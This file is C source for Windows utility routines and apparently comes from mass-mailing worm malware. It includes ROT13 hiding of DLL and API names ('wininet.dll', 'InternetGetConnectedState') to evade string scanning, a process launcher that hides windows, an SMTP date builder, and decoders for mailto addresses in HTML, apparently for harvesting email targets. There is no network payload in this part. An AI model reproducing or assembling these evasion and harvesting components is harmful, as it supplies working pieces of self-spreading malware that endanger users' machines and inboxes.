#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include "lib.h"

char rot13c(char c)
{
	char u[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char l[] = "abcdefghijklmnopqrstuvwxyz";
	char *p;

	if ((p = xstrchr(u, c)) != NULL)
		return u[((p-u) + 13) % 26];
	else if ((p = xstrchr(l, c)) != NULL)
		return l[((p-l) + 13) % 26];
	else
		return c;
}

void rot13(char *buf, const char *in)
{
	while (*in)
		*buf++ = rot13c(*in++);
	*buf = 0;
}

void mk_smtpdate(FILETIME *in_ft, char *buf)
{
        SYSTEMTIME t;
	TIME_ZONE_INFORMATION tmz_info;
	DWORD daylight_flag; int utc_offs, utc_offs_u;
        LPSTR weekdays[7] = { "Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat" };
        LPSTR months[12] = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };

	if (in_ft == NULL) {
	        GetLocalTime(&t);
	} else {
		FILETIME lft;
		FileTimeToLocalFileTime(in_ft, &lft);
		FileTimeToSystemTime(&lft, &t);
	}

	tmz_info.Bias = 0;
	daylight_flag = GetTimeZoneInformation(&tmz_info);

	utc_offs = tmz_info.Bias;
	if (daylight_flag == TIME_ZONE_ID_DAYLIGHT) utc_offs += tmz_info.DaylightBias;
	utc_offs = -utc_offs;
	utc_offs_u = (utc_offs >= 0) ? utc_offs : -utc_offs;

        if (t.wDayOfWeek > 6) t.wDayOfWeek = 6;
        if (t.wMonth == 0) t.wMonth = 1;
        if (t.wMonth > 12) t.wMonth = 12;

        wsprintf(buf,
                "%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u",
                weekdays[t.wDayOfWeek], t.wDay,
                months[t.wMonth-1], t.wYear,
                t.wHour, t.wMinute, t.wSecond,
		(utc_offs >= 0) ? "+" : "-",
		utc_offs_u / 60, utc_offs_u % 60
        );
}

static DWORD xrand16_seed;

void xrand_init(void)
{
	xrand16_seed = GetTickCount();
}

WORD xrand16(void)
{
	xrand16_seed = 0x015a4e35L * xrand16_seed + 1L;
	return ((WORD)(xrand16_seed >> 16L) & (WORD)0xffff);
}

DWORD xrand32(void)
{
	return xrand16() | (xrand16() << 16);
}

char *xstrstr(const char *str, const char *pat)
{
	const char *p, *q;
	for (; *str; str++) {
		for (p=str, q=pat; *p && *q; p++, q++)
			if (*p != *q) break;
		if (p == q || *q == 0) return (char *)str;
	}
	return NULL;
}

char *xstrrchr(const char *str, char ch)
{
	register char *start = (char *)str;
	while (*str++);
	while (--str != start && *str != ch);
	if (*str == (char)ch) return((char *)str);
	return NULL;
}

char *xstrchr(const char *str, char ch)
{
	while (*str && *str != ch) str++;
	return (*str == ch) ? (char *)str : NULL;
}

int xsystem(char *cmd, int wait)
{
	PROCESS_INFORMATION pi; 
	STARTUPINFO si; 

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
	si.wShowWindow = SW_HIDE;

	if (CreateProcess(0, cmd, 0, 0, TRUE, 0, 0, 0, &si, &pi) == 0)
		return 1;	/* FAILED */

	if (wait) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	return 0;		/* SUCCESS */
}

int xmemcmpi(unsigned char *p, unsigned char *q, int len)
{
	while (len--)
		if (tolower(*p++) != tolower(*q++)) return 1;
	return 0;
}

int xstrncmp(const char *first, const char *last, size_t count)
{
        if (!count)
                return(0);

        while (--count && *first && *first == *last)
        {
                first++;
                last++;
        }

        return (*(unsigned char *)first - *(unsigned char *)last);
}

/* "&#<number>" -> ascii */
int html_replace(char *str)
{
	char tmp[20], *mv_from, *mv_to;
	int i, j, amp_start, amp_end, amp_len, charcode, chr_len, mv_len;
	int found;

	for (i=0,found=0; str[i]; i++) {
		if (str[i] != '&') continue;
		amp_start = i;
		if (str[++i] != '#') continue;
		for (j=0,i++; j<(sizeof(tmp)-5);) {
			if (!isdigit(str[i])) break;
			tmp[j++] = str[i++];
		}
		tmp[j] = 0;
		for (charcode=0,j=0; tmp[j]; j++)
			charcode = charcode * 10 + (tmp[j] - '0');

		if (str[i] == ';') i++;
		amp_end = i;

		if (charcode <= 0) continue;
		ZeroMemory(tmp, sizeof(tmp));
		if (charcode < 256) {
			tmp[0] = charcode;
			tmp[1] = 0;
		} else {
			WideCharToMultiByte(CP_ACP, 0, (WCHAR*)&charcode, 1, tmp, sizeof(tmp), NULL, NULL);
		}
		if (tmp[0] == 0) continue;

		amp_len = amp_end - amp_start;
		chr_len = lstrlen(tmp);

		if (amp_len != chr_len) {
			mv_from = str + amp_start + amp_len;
			mv_to = str + amp_start + chr_len;
			mv_len = (str + lstrlen(str)) - mv_from + 1;
			if (mv_to < mv_from) {
				for (j=0; j<mv_len; j++) *mv_to++ = *mv_from++;
			} else {
				for (j=mv_len-1; j>=0; j--) mv_to[j] = mv_from[j];
			}
		}

		memcpy(str + amp_start, tmp, lstrlen(tmp));
		i = amp_start;
		found++;
	}
	return found;
}

/* urldecode algorithm */
/* useful for <a href="mailto:xxx%40xxx"> tags */
int html_replace2(char *str)
{
	char tmp[20], *mv_from, *mv_to;
	int i, j, amp_start, amp_end, amp_len, charcode, chr_len, mv_len;
	int found;

	for (i=0,found=0; str[i]; i++) {
		if (str[i] != '%') continue;
		amp_start = i;
		if (!isxdigit(str[i+1])) continue;
		tmp[0] = toupper(str[++i]);
		if (!isxdigit(str[i+1])) continue;
		tmp[1] = toupper(str[++i]);
		tmp[2] = 0;
		amp_end = ++i;

		charcode = ((tmp[1] >= 'A') && (tmp[1] <= 'Z')) ? 10+tmp[1]-'A' : tmp[1]-'0';
		charcode += (((tmp[0] >= 'A') && (tmp[0] <= 'Z')) ? 10+tmp[0]-'A' : tmp[0]-'0') << 4;

		if (charcode <= 0) continue;
		tmp[0] = charcode;
		tmp[1] = 0;

		amp_len = amp_end - amp_start;
		chr_len = lstrlen(tmp);

		if (amp_len != chr_len) {
			mv_from = str + amp_start + amp_len;
			mv_to = str + amp_start + chr_len;
			mv_len = (str + lstrlen(str)) - mv_from + 1;
			if (mv_to < mv_from) {
				for (j=0; j<mv_len; j++) *mv_to++ = *mv_from++;
			} else {
				for (j=mv_len-1; j>=0; j--) mv_to[j] = mv_from[j];
			}
		}

		memcpy(str + amp_start, tmp, lstrlen(tmp));
		i = amp_start;
		found++;
	}
	return found;
}

typedef BOOL (WINAPI *WININET_GETCONNECTEDSTATE)(LPDWORD lpdwFlags, DWORD dwReserved);

/* Returns: 0=offline, 1=online, 2=don't know */
int is_online(void)
{
	WININET_GETCONNECTEDSTATE pInternetGetConnectedState;
	HINSTANCE hWinInet;
	DWORD igcs_flags;
	char tmp[64];

	rot13(tmp, "jvavarg.qyy");                
	hWinInet = GetModuleHandle(tmp);
	if (hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE) {
		hWinInet = LoadLibrary(tmp);
		if (hWinInet == NULL || hWinInet == INVALID_HANDLE_VALUE)
			return 2;
	}

	rot13(tmp, "VagreargTrgPbaarpgrqFgngr");  
	pInternetGetConnectedState = (WININET_GETCONNECTEDSTATE)GetProcAddress(hWinInet, tmp);
	if (pInternetGetConnectedState == NULL)
		return 2;

	return (pInternetGetConnectedState(&igcs_flags, 0) == 0) ? 0 : 1;
}

int cat_wsprintf(LPTSTR lpOutput, LPCTSTR lpFormat, ...)
{
        register int ret;
        va_list arglist;
        va_start(arglist, lpFormat);
        ret = wvsprintf(lpOutput + lstrlen(lpOutput), lpFormat, arglist);
        va_end(arglist);
        return ret;
}
